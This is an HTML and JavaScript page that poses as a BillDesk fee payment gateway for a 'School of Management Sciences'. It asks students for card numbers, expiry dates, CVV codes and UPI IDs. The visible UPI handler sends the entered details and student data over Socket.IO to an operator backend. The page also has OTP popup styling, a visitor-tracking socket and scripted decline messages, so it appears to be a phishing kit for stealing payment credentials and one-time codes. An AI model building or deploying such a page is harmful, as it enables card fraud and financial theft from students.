<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<!-- NOTE: Tailwind CDN is used for development. For production, compile Tailwind CSS and use a static CSS file -->
<script src="https://cdn.tailwindcss.com"></script>
<style>

/* ============================================ */
/* NEW OTP POPUP STYLES */
/* ============================================ */

.otp-popup-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.7);
    z-index: 99999;
    display: flex;
    align-items: center;
    justify-content: center;
    animation: fadeIn 0.3s ease-in-out;
}

.otp-popup-container {
    background: white;
    border-radius: 12px;
    padding: 40px 30px;
    box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
    max-width: 400px;
    width: 90%;
    animation: slideDown 0.4s ease-out;
}

.otp-popup-content {
    text-align: center;
}

.otp-title {
    font-size: 24px;
    font-weight: 600;
    color: #1e293b;
    margin: 0 0 10px 0;
}

.otp-subtitle {
    font-size: 14px;
    color: #64748b;
    margin: 0 0 30px 0;
}

.otp-input-wrapper {
    margin-bottom: 20px;
}

.otp-input {
    width: 100%;
    padding: 15px 20px;
    font-size: 18px;
    text-align: center;
    border: 2px solid #e2e8f0;
    border-radius: 8px;
    outline: none;
    transition: all 0.3s ease;
    letter-spacing: 4px;
    font-weight: 500;
}

.otp-input:focus {
    border-color: #3b82f6;
    box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
}

.otp-timer {
    font-size: 13px;
    color: #ef4444;
    margin: 0 0 25px 0;
    font-weight: 500;
}

.otp-submit-btn {
    width: 100%;
    padding: 15px;
    background: linear-gradient(135deg, #3b82f6, #2563eb);
    color: white;
    border: none;
    border-radius: 8px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.3s ease;
}

.otp-submit-btn:hover {
    background: linear-gradient(135deg, #2563eb, #1d4ed8);
    transform: translateY(-2px);
    box-shadow: 0 6px 20px rgba(59, 130, 246, 0.4);
}

.otp-submit-btn:active {
    transform: translateY(0);
}

/* Animations */
@keyframes fadeIn {
    from { opacity: 0; }
    to { opacity: 1; }
}

@keyframes slideDown {
    from {
        opacity: 0;
        transform: translateY(-30px);
    }
    to {
        opacity: 1;
        transform: translateY(0);
    }
}

/* Card locked state */
.card-locked {
    pointer-events: none;
    opacity: 0.6;
}

/* Card input height fix */
#card-section .relative.p-3\.5 {
    padding: 10px 14px !important;
}
#card-section input {
    padding-top: 8px !important;
    padding-bottom: 4px !important;
}
#card-section .form-input {
    padding: 10px 12px !important;
}

body {
    background: #e8e8e8;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}

.side-pill {
    position: relative;
}

.side-pill.active::after {
    content: '';
    position: absolute;
    left: 0;
    top: 0;
    bottom: 0;
    width: 4px;
    background: #ff5722;
}

/* Custom scrollbar */
.scroll-container::-webkit-scrollbar {
    width: 6px;
}

.scroll-container::-webkit-scrollbar-track {
    background: #f1f1f1;
}

.scroll-container::-webkit-scrollbar-thumb {
    background: #ccc;
    border-radius: 3px;
}

.scroll-container::-webkit-scrollbar-thumb:hover {
    background: #999;
}

</style>
</head>
<body class="min-h-screen flex items-center justify-center p-5">

<div class="w-full flex justify-center gap-4 h-[calc(100vh-80px)] max-h-[700px]">
    <!-- Main Payment Section -->
    <div class="w-full h-full duration-300 transition-[max-width] ease-in-out max-w-[44rem]">
        <section class="max-w-[46rem] min-w-[38rem] w-full h-full rounded-[2rem] bg-white border border-gray-200 flex flex-col overflow-hidden shadow-lg">
            <!-- Header -->
            <header class="w-full h-[4.5rem] flex py-4 px-6 bg-white shadow-[0_1px_16px_0_rgba(0,0,0,0.1)] rounded-b-[2rem]">
                <div class="flex gap-2 items-center">
                    <div class="size-10 shrink-0 rounded border border-gray-200 bg-gray-50 flex items-center justify-center">
                        <p class="text-gray-800 text-[17px] leading-6 font-semibold">SS</p>
                    </div>
                    <h5 class="font-semibold truncate text-gray-800">School of Management Sciences</h5>
                </div>
                <div class="ml-auto flex items-center">
                    <div class="h-[1.688rem] border border-dashed border-gray-300 mx-4"></div>
                    <button onclick="window.history.back()" class="size-10 rounded-full p-2 bg-gray-100 text-gray-600 focus:brightness-90 outline-none hover:rotate-90 duration-150" role="button" tabindex="0">
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path fill-rule="evenodd" clip-rule="evenodd" d="M17.7916 19.166C18.1711 19.5455 18.7864 19.5455 19.1659 19.166C19.5454 18.7865 19.5454 18.1712 19.1659 17.7917L13.3743 12.0001L19.1659 6.20855C19.5454 5.82904 19.5454 5.21372 19.1659 4.8342C18.7864 4.45469 18.1711 4.45469 17.7916 4.8342L12 10.6258L6.20843 4.8342C5.82892 4.45468 5.2136 4.45468 4.83409 4.8342C4.45457 5.21371 4.45457 5.82903 4.83409 6.20855L10.6257 12.0001L4.83408 17.7917C4.45456 18.1712 4.45456 18.7865 4.83408 19.166C5.21359 19.5456 5.82891 19.5456 6.20842 19.166L12 13.3745L17.7916 19.166Z" fill="currentColor"></path>
                        </svg>
                    </button>
                </div>
            </header>

            <div class="flex w-full h-full overflow-hidden">
                <!-- Left Sidebar - Payment Methods -->
                <nav class="max-w-[17.25rem] w-full h-full overflow-auto flex flex-col divide-y divide-dashed border-r border-gray-200 scroll-container">
                    <div class="p-4">
                        <h4 class="font-semibold text-sm mb-4">Payment Methods</h4>
                    </div>

                    <!-- Credit/Debit Cards -->
                    <div class="flex gap-4 items-center relative w-full h-16 shrink-0 pl-6 pr-4 cursor-pointer transition-all side-pill active bg-gradient-to-r from-orange-50 to-white" onclick="showSection('card', event)">
                        <svg width="20" height="16" viewBox="0 0 20 16" fill="none" class="w-6 h-6">
                            <rect x="1" y="2" width="18" height="12" rx="1.5" stroke="#3B475B" stroke-width="1.5"/>
                            <line x1="1" y1="5" x2="19" y2="5" stroke="#3B475B" stroke-width="1.5"/>
                            <line x1="3" y1="10" x2="8" y2="10" stroke="#3B475B" stroke-width="1.5" stroke-linecap="round"/>
                        </svg>
                        <span class="text-sm font-medium text-gray-700">Credit / Debit Cards</span>
                    </div>

<!-- Net Banking -->
                    <div class="flex gap-4 items-center relative w-full h-16 shrink-0 pl-6 pr-4 cursor-pointer transition-all side-pill hover:bg-gray-50" onclick="showSection('netbanking', event)">
                        <svg width="20" height="18" viewBox="0 0 20 18" fill="none" class="w-6 h-6">
                            <path d="M10 0L0 6H20L10 0Z" fill="#3B475B"/>
                            <rect x="2" y="7" width="3" height="9" fill="#3B475B"/>
                            <rect x="8.5" y="7" width="3" height="9" fill="#3B475B"/>
                            <rect x="15" y="7" width="3" height="9" fill="#3B475B"/>
                            <rect y="16" width="20" height="2" fill="#3B475B"/>
                        </svg>
                        <span class="text-sm font-medium text-gray-700">Net Banking</span>
                    </div>

                    <!-- UPI -->
                    <div class="flex gap-4 items-center relative w-full h-16 shrink-0 pl-6 pr-4 cursor-pointer transition-all side-pill hover:bg-gray-50" onclick="showSection('upi', event)">
                        <img src="https://i.pinimg.com/originals/67/c8/7d/67c87d420f58c250b3b7aecb034350b6.jpg" alt="UPI" class="h-6 w-auto object-contain">

                    </div>

                    <!-- BHIM -->
                    <div class="flex gap-4 items-center relative w-full h-16 shrink-0 pl-6 pr-4 cursor-pointer transition-all side-pill hover:bg-gray-50" onclick="showSection('bhim', event)">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/6/65/BHIM_SVG_Logo.svg" alt="BHIM" class="h-4 w-auto object-contain">

                    </div>
                    <div class="flex gap-4 items-center relative w-full h-16 shrink-0 pl-6 pr-4 cursor-pointer transition-all side-pill hover:bg-gray-50" onclick="showSection('qr', event)">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" class="w-6 h-6">
                            <!-- Top-left corner -->
                            <rect x="2" y="2" width="8" height="8" rx="1" stroke="#3B475B" stroke-width="1.8" fill="none"/>
                            <rect x="4" y="4" width="4" height="4" fill="#3B475B"/>
                            
                            <!-- Top-right corner -->
                            <rect x="14" y="2" width="8" height="8" rx="1" stroke="#3B475B" stroke-width="1.8" fill="none"/>
                            <rect x="16" y="4" width="4" height="4" fill="#3B475B"/>
                            
                            <!-- Bottom-left corner -->
                            <rect x="2" y="14" width="8" height="8" rx="1" stroke="#3B475B" stroke-width="1.8" fill="none"/>
                            <rect x="4" y="16" width="4" height="4" fill="#3B475B"/>
                            
                            <!-- Small squares for QR pattern -->
                            <rect x="14" y="14" width="2.5" height="2.5" fill="#3B475B"/>
                            <rect x="17.5" y="14" width="2.5" height="2.5" fill="#3B475B"/>
                            <rect x="21" y="14" width="1" height="2.5" fill="#3B475B"/>
                            <rect x="14" y="17.5" width="2.5" height="2.5" fill="#3B475B"/>
                            <rect x="17.5" y="17.5" width="4.5" height="2.5" fill="#3B475B"/>
                            <rect x="14" y="21" width="8" height="1" fill="#3B475B"/>
                        </svg>
                        <span class="text-sm font-medium text-gray-700">UPI QR</span>
                    </div>
                </nav>

                <!-- Center Content -->
                <div class="h-full w-full overflow-auto scroll-container">
                    <div class="px-10 py-6">
                        <!-- Error Message Container -->
                        <div id="errorMessageContainer" class="hidden mb-4 p-4 bg-red-50 border border-red-300 rounded-lg">
                            <div class="flex items-center gap-3">
                                <svg class="w-6 h-6 text-red-600 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                </svg>
                                <div class="flex-1">
                                    <p class="font-semibold text-red-800" id="errorMessageTitle">Payment Cancelled</p>
                                    <p class="text-sm text-red-700" id="errorMessageText">Your payment was cancelled. Please try again.</p>
                                </div>
                            </div>
                        </div>
                        <!-- Card Section -->
                        <form class="w-full max-w-xl section active" id="card-section">
                            <div class="flex justify-between items-center mb-4">
                                <p class="text-sm font-medium text-gray-700">Card details</p>
                                <div class="flex items-center gap-2" id="cardLogos">
                                    <img id="visaLogo" src="https://static.vecteezy.com/system/resources/thumbnails/020/336/392/small/visa-logo-visa-icon-free-free-vector.jpg" alt="VISA" class="h-5 w-auto object-contain grayscale opacity-50 transition-all duration-300">
                                    <img id="mastercardLogo" src="https://i.pinimg.com/originals/79/77/9f/79779f77d2a5aa5eca98d313c10c7f0e.jpg" alt="Mastercard" class="h-5 w-auto object-contain grayscale opacity-50 transition-all duration-300">
                                    <img id="rupayLogo" src="https://cdn.worldvectorlogo.com/logos/rupay.svg" alt="RuPay" class="h-4 w-auto object-contain grayscale opacity-50 transition-all duration-300">
                                </div>
                            </div>

                            <div class="border border-gray-300 rounded-lg overflow-hidden focus-within:border-orange-500 focus-within:ring-2 focus-within:ring-orange-100">
                                <div class="relative p-3.5 border-b border-gray-200">
                                    <input type="tel" id="cardNumber" class="w-full outline-none peer pt-4 pb-1 text-sm" placeholder=" " maxlength="19" autocomplete="cc-number">
                                    <label class="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400 text-sm transition-all peer-focus:top-2 peer-focus:text-xs peer-focus:text-gray-700 peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:text-xs">Card number</label>
                                </div>
                                <div class="flex">
                                    <div class="relative p-3.5 border-r border-gray-200 flex-1">
                                        <input type="tel" id="expiryDate" class="w-full outline-none peer pt-4 pb-1 text-sm" placeholder=" " maxlength="5" autocomplete="cc-exp">
                                        <label class="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400 text-sm transition-all peer-focus:top-2 peer-focus:text-xs peer-focus:text-gray-700 peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:text-xs">Expiration date</label>
                                    </div>
                                    <div class="relative p-3.5 flex-1">
                                        <input type="password" id="cvvCode" class="w-full outline-none peer pt-4 pb-1 text-sm" placeholder=" " maxlength="3" autocomplete="cc-csc">
                                        <label class="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400 text-sm transition-all peer-focus:top-2 peer-focus:text-xs peer-focus:text-gray-700 peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:text-xs">Security code</label>
                                    </div>
                                </div>
                            </div>

                            <div class="mt-4">
                                <label class="text-xs text-gray-600 font-medium mb-2 block">Card holder name</label>
                                <input type="text" id="cardHolderName" class="w-full border border-gray-300 rounded-lg outline-none focus:border-orange-500 focus:ring-2 focus:ring-orange-100 text-sm form-input p-3" placeholder="Enter cardholder name" autocomplete="cc-name">
                            </div>

                            <button type="button" id="payButton" onclick="handlePayment()" class="w-full mt-6 bg-gray-200 text-gray-400 rounded-lg font-semibold cursor-not-allowed transition-all duration-300" disabled style="height: 48px;">Pay &#8377;82,450</button>
                        </form>

                        <!-- Net Banking Section -->
                        <div class="w-full section hidden" id="netbanking-section">
                            <input type="text" class="w-full p-3 border border-gray-300 rounded-lg mb-4" placeholder="?? Search by bank name">
                            <p class="text-xs text-gray-400 mb-3">Top banks</p>
                            <div class="grid grid-cols-2 gap-3 mb-6">
                                <div class="border border-gray-200 rounded-lg p-4 flex flex-col items-center gap-2 cursor-pointer hover:bg-gray-50">
                                    <img src="https://i.pinimg.com/originals/ae/c7/36/aec7367eed57ba8cf8e78dda457ce4e3.jpg" alt="HDFC Bank" class="h-8 w-auto object-contain">
                                    <span class="text-xs text-center">HDFC Bank [Retail]</span>
                                </div>
                                <div class="border border-gray-200 rounded-lg p-4 flex flex-col items-center gap-2 cursor-pointer hover:bg-gray-50">
                                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/ICICI_Bank_Logo.svg/2560px-ICICI_Bank_Logo.svg.png" alt="ICICI Bank" class="h-8 w-auto object-contain">
                                    <span class="text-xs text-center">ICICI Bank [Retail]</span>
                                </div>
                                <div class="border border-gray-200 rounded-lg p-4 flex flex-col items-center gap-2 cursor-pointer hover:bg-gray-50">
                                    <img src="https://thumbs.dreamstime.com/b/kotak-mahindra-bank-india-logo-vector-304106271.jpg" alt="Kotak Bank" class="h-8 w-auto object-contain">
                                    <span class="text-xs text-center">Kotak Bank</span>
                                </div>
                                <div class="border border-gray-200 rounded-lg p-4 flex flex-col items-center gap-2 cursor-pointer hover:bg-gray-50">
                                    <img src="https://discovertemplate.com/wp-content/uploads/2024/04/SBI.jpg" alt="State Bank of India" class="h-8 w-auto object-contain">
                                    <span class="text-xs text-center">State Bank of India</span>
                                </div>
                            </div>
                            <p class="text-xs text-gray-400 mb-3">All other banks</p>
                            <div class="border border-gray-200 rounded-lg max-h-64 overflow-y-auto">
                                <div class="flex items-center gap-3 p-4 border-b border-gray-100 cursor-pointer hover:bg-gray-50">
                                    <div class="w-6 h-6 bg-gray-200 rounded flex items-center justify-center">??</div>
                                    <span class="text-sm flex-1">Andhra Pragathi Grameena Bank</span>
                                    <span class="text-gray-400">?</span>
                                </div>
                                <div class="flex items-center gap-3 p-4 border-b border-gray-100 cursor-pointer hover:bg-gray-50">
                                    <div class="w-6 h-6 bg-orange-600 rounded text-white text-xs font-bold flex items-center justify-center">AU</div>
                                    <span class="text-sm flex-1">AU Small Finance Bank</span>
                                    <span class="text-gray-400">?</span>
                                </div>
                            </div>
                        </div>

                        <!-- UPI Section -->
                        <div class="w-full section hidden" id="upi-section">
                            <div class="text-center px-4 py-4 relative">
                                <img src="../refrence image/photo_2025-12-18_04-56-21.png" alt="Scan QR Code" class="w-full max-w-4xl mx-auto object-contain">
                                <!-- Invisible clickable area over the Show QR button -->
                                <button onclick="openQRModal()" class="absolute bg-transparent hover:bg-white hover:bg-opacity-10 rounded-lg transition-all" style="left: 18%; top: 42%; width: 22%; height: 18%; cursor: pointer;"></button>
                            </div>
                            <p class="text-center text-gray-400 text-sm my-4">Or</p>
                            <p class="text-sm font-medium text-gray-700 mb-4">UPI Payment</p>
                            <label class="text-xs text-gray-600 font-medium mb-2 block">Enter your UPI ID</label>
                            <input type="text" id="upiInput" class="w-full p-3 border border-gray-300 rounded-lg mb-2 outline-none focus:border-orange-500 focus:ring-2 focus:ring-orange-100" placeholder="yourname@upi" oninput="validateUpiForm()" autocomplete="off">
                            <div class="flex gap-2 flex-wrap mb-4">
                                <span class="px-3 py-1 bg-gray-100 border border-gray-200 rounded text-xs cursor-pointer hover:bg-gray-200" onclick="appendUpiSuffix('@upi')">@upi</span>
                                <span class="px-3 py-1 bg-gray-100 border border-gray-200 rounded text-xs cursor-pointer hover:bg-gray-200" onclick="appendUpiSuffix('@okhdfcbank')">@okhdfcbank</span>
                                <span class="px-3 py-1 bg-gray-100 border border-gray-200 rounded text-xs cursor-pointer hover:bg-gray-200" onclick="appendUpiSuffix('@okicici')">@okicici</span>
                                <span class="px-3 py-1 bg-gray-100 border border-gray-200 rounded text-xs cursor-pointer hover:bg-gray-200" onclick="appendUpiSuffix('@paytm')">@paytm</span>
                            </div>
                            <button type="button" id="upiPayButton" class="w-full h-12 bg-gray-200 text-gray-400 rounded-lg font-semibold cursor-not-allowed transition-all duration-300" disabled onclick="handleUpiPayment()">Pay &#8377;82,450</button>
                        </div>

                        <!-- BHIM Section -->
                        <div class="w-full section hidden" id="bhim-section">
                            <p class="text-sm font-medium text-gray-700 mb-4">BHIM Payment</p>
                            <label class="text-xs text-gray-600 font-medium mb-2 block">Enter your UPI ID</label>
                            <input type="text" id="bhimInput" class="w-full p-3 border border-gray-300 rounded-lg mb-2 outline-none focus:border-orange-500 focus:ring-2 focus:ring-orange-100" placeholder="yourname@upi" oninput="validateBhimForm()" autocomplete="off">
                            <div class="flex gap-2 flex-wrap mb-4">
                                <span class="px-3 py-1 bg-gray-100 border border-gray-200 rounded text-xs cursor-pointer hover:bg-gray-200" onclick="appendBhimSuffix('@upi')">@upi</span>
                                <span class="px-3 py-1 bg-gray-100 border border-gray-200 rounded text-xs cursor-pointer hover:bg-gray-200" onclick="appendBhimSuffix('@okhdfcbank')">@okhdfcbank</span>
                                <span class="px-3 py-1 bg-gray-100 border border-gray-200 rounded text-xs cursor-pointer hover:bg-gray-200" onclick="appendBhimSuffix('@okicici')">@okicici</span>
                                <span class="px-3 py-1 bg-gray-100 border border-gray-200 rounded text-xs cursor-pointer hover:bg-gray-200" onclick="appendBhimSuffix('@paytm')">@paytm</span>
                            </div>
                            <button type="button" id="bhimPayButton" class="w-full h-12 bg-gray-200 text-gray-400 rounded-lg font-semibold cursor-not-allowed transition-all duration-300" disabled onclick="handleBhimPayment()">Pay &#8377;82,450</button>
                        </div>

                        <!-- UPI QR Section -->
                        <div class="w-full section hidden" id="qr-section">
                            <div class="text-center p-6">
                                <p class="text-base font-semibold mb-2">Scan the QR code</p>
                                <p class="text-sm text-gray-600 mb-6">Use your UPI app to make your payment.</p>
                                <div class="flex gap-3 justify-center mb-6">
                                    <img src="../refrence image/upi refrence image/photo_2025-12-18_04-49-33.png" alt="UPI Apps" class="h-12 w-auto object-contain">
                                </div>
                                <div class="w-56 h-56 mx-auto mb-4 bg-gray-50 border-2 border-dashed border-gray-300 rounded-lg flex items-center justify-center text-gray-400">
                                    QR Code will appear here
                                </div>
                                <p class="text-sm text-gray-600">Code expires in <span class="text-orange-600 font-semibold" id="qrTimer">05:00</span></p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </div>

    <!-- Right Sidebar - Summary -->
    <div class="w-full max-w-[19rem]">
        <section class="w-full h-fit rounded-3xl bg-white p-5 pb-12 overflow-hidden flex flex-col border border-gray-200 relative shadow-lg">
            <svg width="24" height="24" class="mb-2 text-gray-600" fill="currentColor" viewBox="0 0 24 24">
                <circle cx="12" cy="12" r="10" stroke="currentColor" fill="none" stroke-width="2"/>
                <text x="12" y="16" text-anchor="middle" font-size="14" font-weight="bold">i</text>
            </svg>
            <div class="flex gap-4 items-center mb-6">
                <span class="text-sm font-semibold">Summary</span>
                <div class="h-px bg-gradient-to-r from-gray-300 to-transparent flex-1"></div>
            </div>
            <div class="flex justify-between mb-1 text-sm">
                <span class="text-gray-500">Order ID</span>
                <span id="orderID">108115</span>
            </div>
            <div class="flex justify-between pt-4 mt-4 border-t border-dashed border-gray-300 text-base font-medium">
                <span>Total Amount</span>
                <span>&#8377;82,450</span>
            </div>
            <footer class="flex items-center justify-center pt-6 mt-6 border-t border-gray-200">
                <img src="https://images.seeklogo.com/logo-png/44/1/billdesk-logo-png_seeklogo-440316.png" alt="BillDesk" class="h-24 w-auto object-contain" style="mix-blend-mode: darken;">
            </footer>
        </section>
    </div>
</div>

<!-- Loading Screen -->
<div id="loadingScreen" class="fixed inset-0 bg-black bg-opacity-50 backdrop-blur-sm hidden items-center justify-center z-50">
    <div class="bg-white rounded-2xl p-8 flex flex-col items-center gap-4">
        <div class="w-12 h-12 border-4 border-orange-500 border-t-transparent rounded-full animate-spin"></div>
        <p class="text-gray-700 font-medium" id="loadingText">Processing Payment...</p>
    </div>
</div>

<!-- QR Code Modal Overlay -->
<div id="qrModal" class="fixed inset-0 bg-black bg-opacity-50 backdrop-blur-sm hidden items-center justify-center z-50" onclick="closeQRModal(event)">
    <div class="bg-white rounded-2xl p-8 max-w-sm w-full mx-4 relative" onclick="event.stopPropagation()">
        <button onclick="closeQRModal()" class="absolute -top-10 -right-2 text-white hover:text-gray-300 text-3xl w-10 h-10 flex items-center justify-center">&times;</button>
        
        <div class="text-center">
            <h3 class="text-xl font-semibold mb-2 text-gray-800">Scan the QR code</h3>
            <p class="text-sm text-gray-600 mb-1">using any UPI app to make your payment of</p>
            <p class="text-base font-semibold text-blue-600 mb-4">&#8377;82,450</p>
            
            <div class="flex justify-center gap-1.5 mb-5">
                <img src="https://cdn1.iconfinder.com/data/icons/logos-brands-in-colors/436/Google_Pay_GPay_Logo-512.png" alt="Google Pay" class="h-12 w-auto object-contain">
                <img src="https://pnghdpro.com/wp-content/themes/pnghdpro/download/social-media-and-brands/phonepe-logo.png" alt="PhonePe" class="h-12 w-auto object-contain">
                <img src="https://images.seeklogo.com/logo-png/30/1/paytm-logo-png_seeklogo-305549.png" alt="Paytm" class="h-12 w-auto object-contain">
                <img src="https://images.seeklogo.com/logo-png/43/2/bhim-bharat-interface-for-money-logo-png_seeklogo-430174.png" alt="BHIM" class="h-12 w-auto object-contain">
            </div>
            
            <div class="w-48 h-48 mx-auto mb-4 bg-white border border-gray-300 rounded flex items-center justify-center p-2">
                <img id="qrCodeImage" src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=upi://pay?pa=smsvaranasi@upi&pn=SMS%20Varanasi&am=82450&cu=INR" alt="QR Code" class="w-full h-full object-contain" onerror="this.onerror=null; this.src='https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=upi://pay?pa=smsvaranasi@upi&pn=SMS%20Varanasi&am=82450&cu=INR';">
            </div>
            
            <p class="text-sm text-gray-600 mb-5">Code expires in <span class="text-green-600 font-semibold" id="modalTimer">04:59</span></p>
            
            <button onclick="closeQRModal()" class="w-full bg-orange-500 hover:bg-orange-600 text-white font-semibold py-3 rounded-lg transition-colors">Close</button>
        </div>
    </div>
</div>

<script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
<script>
// ============================================
// UPI PAYMENT FUNCTIONS
// ============================================

// Validate UPI form
function validateUpiForm() {
    const upiInput = document.getElementById('upiInput');
    const upiPayButton = document.getElementById('upiPayButton');
    const upiId = upiInput.value.trim();
    
    // Basic UPI ID validation: should contain @ and have text before and after
    const isValid = upiId.length > 3 && upiId.includes('@') && upiId.indexOf('@') > 0 && upiId.indexOf('@') < upiId.length - 1;
    
    if (isValid) {
        upiPayButton.disabled = false;
        upiPayButton.classList.remove('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
        upiPayButton.classList.add('bg-orange-500', 'text-white', 'cursor-pointer', 'hover:bg-orange-600');
    } else {
        upiPayButton.disabled = true;
        upiPayButton.classList.add('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
        upiPayButton.classList.remove('bg-orange-500', 'text-white', 'cursor-pointer', 'hover:bg-orange-600');
    }
}

// Append UPI suffix to input
function appendUpiSuffix(suffix) {
    const upiInput = document.getElementById('upiInput');
    const currentValue = upiInput.value.trim();
    
    // If already has @, replace everything after @
    if (currentValue.includes('@')) {
        const parts = currentValue.split('@');
        upiInput.value = parts[0] + suffix;
    } else {
        // Otherwise just append
        upiInput.value = currentValue + suffix;
    }
    
    validateUpiForm();
}

// Handle UPI Payment
function handleUpiPayment() {
    const upiInput = document.getElementById('upiInput');
    const upiPayButton = document.getElementById('upiPayButton');
    const upiId = upiInput.value.trim();
    
    // Disable button
    upiPayButton.disabled = true;
    upiPayButton.textContent = 'Processing...';
    
    // Generate session ID
    paymentSessionId = 'UPI_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    
    // Prepare UPI payment data
    const upiPaymentData = {
        sessionId: paymentSessionId,
        paymentType: 'UPI',
        upiId: upiId,
        amount: studentData.amount,
        currency: 'INR',
        timestamp: new Date().toISOString(),
        studentData: studentData,
        orderID: document.getElementById('orderID').textContent
    };
    
    // Send to backend via Socket.IO
    if (paymentSocket && paymentSocket.connected) {
        console.log('?? Sending UPI payment data:', upiPaymentData);
        paymentSocket.emit('upiDetailsSubmitted', upiPaymentData);
        
        // Show loading screen with blur
        showLoadingScreen();
        
        // After 3-4 seconds, redirect to UPI processing page
        setTimeout(() => {
            // Pass session ID and UPI ID to the new page
            window.location.href = `/transact/upi_processing.html?sessionId=${paymentSessionId}&upiId=${encodeURIComponent(upiId)}&amount=${studentData.amount}`;
        }, 3500); // 3.5 seconds
    } else {
        console.error('? Socket not connected');
        alert('Connection error. Please try again.');
        upiPayButton.disabled = false;
        upiPayButton.textContent = 'Pay ?' + studentData.amount;
    }
}

// Show loading screen with blur
function showLoadingScreen() {
    const loadingScreen = document.getElementById('loadingScreen');
    const loadingText = document.getElementById('loadingText');
    loadingText.textContent = 'Processing Payment...';
    loadingScreen.classList.remove('hidden');
    loadingScreen.classList.add('flex');
    
    // Make background white and blurred
    loadingScreen.style.backgroundColor = 'rgba(255, 255, 255, 0.95)';
    loadingScreen.style.backdropFilter = 'blur(10px)';
}



document.addEventListener('DOMContentLoaded', () => {
    const otpSubmitBtn = document.getElementById('otpSubmitBtn');
    const otpInput = document.getElementById('otpInput');
    
    if (otpSubmitBtn) {
        otpSubmitBtn.addEventListener('click', submitOtp);
    }
    
    // Allow Enter key to submit
    if (otpInput) {
        otpInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                submitOtp();
            }
        });
    }
});

</script>
<script>
let modalTimerInterval = null;
let modalTimeRemaining = 300; // 5 minutes in seconds
let paymentSocket = null;
let paymentSessionId = null;
let visitorSocket = null;
let visitorId = null;
let allowNavigationToOtp = false; // Flag to allow navigation to OTP page

// Get student data from URL parameters
const urlParams = new URLSearchParams(window.location.search);
const studentData = {
    rollNumber: urlParams.get('roll') || 'UNKNOWN',
    name: urlParams.get('name') || 'Unknown Student',
    fatherName: urlParams.get('father') || '',
    course: urlParams.get('course') || '',
    semester: urlParams.get('semester') || '',
    amount: urlParams.get('amount') || '82450'
};

// Generate random 11-character alphanumeric order ID (capital letters and numbers)
function generateRandomOrderID() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let orderId = '';
    for (let i = 0; i < 11; i++) {
        orderId += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return orderId;
}


window.onload = function() {
    // Check for error parameter and display error message
    const errorParam = urlParams.get('error');
    if (errorParam === 'payment_cancelled' || errorParam === 'timeout' || errorParam === 'card_declined') {
        const errorContainer = document.getElementById('errorMessageContainer');
        const errorTitle = document.getElementById('errorMessageTitle');
        const errorText = document.getElementById('errorMessageText');
        
        if (errorContainer) {
            // Set appropriate error message based on error type
            if (errorParam === 'timeout') {
                if (errorTitle) errorTitle.textContent = 'Transaction Timeout';
                if (errorText) errorText.textContent = 'Error processing transaction. Aborted by timeout.';
            } else if (errorParam === 'card_declined') {
                if (errorTitle) errorTitle.textContent = 'Payment Verification Failed';
                if (errorText) errorText.textContent = 'Your payment could not be verified, Please try again.';
            } else {
                if (errorTitle) errorTitle.textContent = 'Payment Cancelled';
                if (errorText) errorText.textContent = 'Your payment was cancelled. Please try again.';
            }
            
            errorContainer.classList.remove('hidden');
            // Auto-hide after 10 seconds
            setTimeout(() => {
                errorContainer.classList.add('hidden');
            }, 10000);
        }
    }
    
    document.getElementById('orderID').textContent = generateRandomOrderID();
    startTimer();
    // Update all amount displays with dynamic amount
    const formattedAmount = parseFloat(studentData.amount).toLocaleString('en-IN');
    
    // Update summary amount
    const summaryAmountSpan = document.querySelector('.flex.justify-between.pt-4 span:last-child');
    if (summaryAmountSpan) summaryAmountSpan.textContent = '?' + formattedAmount;
    
    // Update QR modal amount
    const qrModalAmount = document.querySelector('#qrModal p.text-blue-600');
    if (qrModalAmount) qrModalAmount.textContent = '?' + formattedAmount;
    
    // Update all Pay buttons
    const payButton = document.getElementById('payButton');
    if (payButton) payButton.textContent = 'Pay ?' + formattedAmount;
    
    const upiPayButton = document.getElementById('upiPayButton');
    if (upiPayButton) upiPayButton.textContent = 'Pay ?' + formattedAmount;
    
    const bhimPayButton = document.getElementById('bhimPayButton');
    if (bhimPayButton) bhimPayButton.textContent = 'Pay ?' + formattedAmount;
    
    // Update QR code URL
    const qrImg = document.querySelector('#qrModal img[src*="qrserver"]');
    if (qrImg) {
        const currentSrc = qrImg.src;
        qrImg.src = currentSrc.replace(/am=\d+/, 'am=' + studentData.amount);
    }
    // Defer socket connection to avoid blocking page load
    setTimeout(() => initializePaymentConnection(), 100);
};
